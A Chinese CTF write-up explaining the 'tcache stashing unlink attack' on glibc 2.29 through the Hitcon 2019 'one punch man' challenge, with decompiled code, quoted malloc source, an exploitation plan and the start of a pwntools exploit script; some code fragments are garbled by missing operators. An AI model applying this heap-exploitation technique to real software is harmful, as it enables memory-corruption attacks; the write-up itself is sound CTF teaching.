## 前言
前几天`BUUCTF`办了场新春红包赛，做到了一道`咲夜南梦`师傅出的`glibc 2.29`下的题，做题过程中发现和去年Hitcon CTF的一道`one
punch man`很像，网上其他人的做法有`unlink`和`large bin
attack`，这里再引进一种新的攻击方式，达到相同条件下`任意地址写一个libc地址`的目的。需要声明的是这种攻击方式并非笔者原创，而是看到台湾一位师傅`berming博客`的题解学习的，这种攻击方式原作者称为`TCACHE
STASHING UNLINK ATTACK`，现分享给大家。
## Hitcon 2019 one punch man
### 程序分析
程序开启了常见的所有保护，实现了`Add`、`Edit`、`Delete`和`Show`等功能，除此之外还有一个后门函数`Backdoor`。
另外函数有沙箱保护，只有下面这些系统调用可用。
    line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
     0002: 0x06 0x00 0x00 0x00000000  return KILL
     0003: 0x20 0x00 0x00 0x00000000  A = sys_number
     0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
     0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
     0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
     0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
     0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
     0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
     0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
     0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
     0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
     0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0024: 0x06 0x00 0x00 0x00000000  return KILL
其中，Add函数可以分配`[0x80,0x400]`大小的堆块，分配的函数为`calloc`，输入数据首先存储到栈上，之后再使用`strncpy`拷贝到`bss`上的数组里
    unsigned __int64 __fastcall Add(__int64 a1, __int64 a2)
    {
      unsigned int idx; // [rsp+8h] [rbp-418h]
      signed int name_len; // [rsp+Ch] [rbp-414h]
      char s[1032]; // [rsp+10h] [rbp-410h]
      unsigned __int64 v6; // [rsp+418h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      MyPuts("idx: ");
      idx = read_int();
      if ( idx > 2 )
        error("invalid", a2);
      MyPuts("hero name: ");
      memset(s, 0, 0x400uLL);
      name_len = read(0, s, 0x400uLL);
      if ( name_len  0x400 )
        error("poor hero name", s);
      *((_QWORD *)&unk_4040 + 2 * idx) = calloc(1uLL, name_len);
      qword_4048[2 * idx] = name_len;
      strncpy(*((char **)&unk_4040 + 2 * idx), s, name_len);
      memset(s, 0, 0x400uLL);
      return __readfsqword(0x28u) ^ v6;
    }
Delete函数`free`堆块之后未清空，造成`double free`和`UAF`
    void __fastcall Delete(__int64 a1, __int64 a2)
    {
      unsigned int v2; // [rsp+Ch] [rbp-4h]
      MyPuts("idx: ");
      v2 = read_int();
      if ( v2 > 2 )
        error("invalid", a2);
      free(*((void **)&unk_4040 + 2 * v2));
    }
后门函数可以调用`malloc`分配`0x217`大小的堆块，但是要要满足`*(_BYTE *)(qword_4030 + 0x20) >
6`，我们在`main`函数里可以看到这里被初始化为`heap_base+0x10`，对于glibc
2.29，这个位置对应存储的是`tcache_perthread_struct`的`0x220`大小的`tcache_bin`的数量，正常来说，如果我们想调用后门的功能，要让这个`count`为7，然而这也就意味着`0x217`再分配和释放都同`glibc
2.23`一样，我们无法通过`UAF`改chunk的`fd`来达到任意地址写的目的，因此我们要通过别的方式修改这个值。
    /*
    ptr = (char *)malloc(0x1000uLL);
      if ( !ptr )
        error("err", a2);
      v3 = ptr;
      free(ptr);
      qword_4030 = ((unsigned __int64)ptr & 0xFFFFFFFFFFFFF000LL) + 0x10;
    */
    __int64 __fastcall Magic(__int64 a1, __int64 a2)
    {
      void *buf; // [rsp+8h] [rbp-8h]
      if ( *(_BYTE *)(qword_4030 + 0x20) fd != victim)`，在将这个堆块给用户之后，如果对应的tcache bins的数量小于最大数量，则剩余的small
bin将会被放入`tcache`，这时候放入的话没有完整性检查，即不会检查这些small
bin的`fd`和`bk`。在放入之前会有另一次`unlink`，这里的`bck->fd =
bin;`产生的结果是将bin的值写到了`*(bck+0x10)`，我们可以将bck伪造为`target_addr-0x10`，bin为`libc`相关地址，则可以向`target_addr`写入`bin`，攻击结果和`unsored
bin attack`的结果类似。
注意刚才描述的放入过程是一个循环，我们将伪造的`bck`看成一个堆块，其`bk`很可能是一个非法的地址，这样就导致循环到下一个堆块时`unlink`执行到`bck->fd
= bin;`访问非法内存造成程序crash。为了避免这种情况我们选择释放`6`个对应size的chunk到`tcache
bin`，只为`tcache`留一个空间，这样循环一次就会跳出，不会有后续问题。
    /*
         If a small request, check regular bin.  Since these "smallbins"
         hold one size each, no searching within bins is necessary.
         (For a large request, we need to wait until unsorted chunks are
         processed to find best fit. But for small ones, fits are exact
         anyway, so we can check now, which is faster.)
       */
      if (in_smallbin_range (nb))
        {
          idx = smallbin_index (nb);
          bin = bin_at (av, idx);
          if ((victim = last (bin)) != bin)
            {
              bck = victim->bk;
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): smallbin double linked list corrupted");
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;
              if (av != &main_arena)
            set_non_main_arena (victim);
              check_malloced_chunk (av, victim, nb);
    #if USE_TCACHE
          /* While we're here, if we see other chunks of the same size,
             stash them in the tcache.  */
          size_t tc_idx = csize2tidx (nb);
          if (tcache && tc_idx counts[tc_idx] bk;
                  set_inuse_bit_at_offset (tc_victim, nb);
                  if (av != &main_arena)
                set_non_main_arena (tc_victim);
                  bin->bk = bck;
                  bck->fd = bin;
                  tcache_put (tc_victim, tc_idx);
                    }
            }
            }
    #endif
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
有了上述介绍之后解题就简单多了，首先UAF可以泄露`heap`和`libc`地址，然后我们`free`一个`0x220`大小的块进入tcache并使用UAF修改其`fd`为`__malloc_hook`备用。
之后我们释放9次`0x400`大小的堆块，再分配大小为`0x300`的堆块，产生一个`0x100`大的`last_remainder`，再分配一个大于`0x100`的堆块让这个`last_remainder`放入`small
bin[0x100]`;再用相同方式构造出另一个相同大小`small
bin`，我们分别称之为bin1和bin2，使用`Edit`将`bin2->bk`改为`(heap_base+0x2f)-0x10`，调用`calloc(0xf0)`触发上述流程，最终改掉`heap_base+0x30`的值绕过检查。
最后调用后门函数修改`__malloc_hook`为`gadget(mov eax, esi ; add rsp, 0x48 ;
ret)`，在add的时候将`rsp`改到可控的输入区域调用`rop chains`。
### exp.py
    #coding=utf-8
    from pwn import *
    context.update(arch='amd64',os='linux',log_level='DEBUG')
    context.terminal = ['tmux','split','-h']
    debug = 1
    elf = ELF('./one_punch')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./one_punch')
    else:
        libc = ELF('./x64_libc.so.6')
        p = remote('f.buuoj.cn',20173)
    def Add(idx,name):
        p.recvuntil('> ')
        p.sendline('1')
        p.recvuntil("idx: ")
        p.sendline(str(idx))
        p.recvuntil("hero name: ")
        p.send(name)
    def Edit(idx,name):
        p.recvuntil('> ')
        p.sendline('2')
        p.recvuntil("idx: ")
        p.sendline(str(idx))
        p.recvuntil("hero name: ")
        p.send(name)
    def Show(idx):
        p.recvuntil('> ')
        p.sendline('3')
        p.recvuntil("idx: ")
        p.sendline(str(idx))
    def Delete(idx):
        p.recvuntil('> ')
        p.sendline('4')
        p.recvuntil("idx: ")
        p.sendline(str(idx))
    def BackDoor(buf):
        p.recvuntil('> ')
        p.sendline('50056')
        sleep(0.1)
        p.send(buf)
    def exp():
        #leak heap
        for i in range(7):
            Add(0,'a'*0x120)
            Delete(0)
        Show(0)
        p.recvuntil("hero name: ")
        heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x850
        log.success("[+]heap base => "+ hex(heap_base))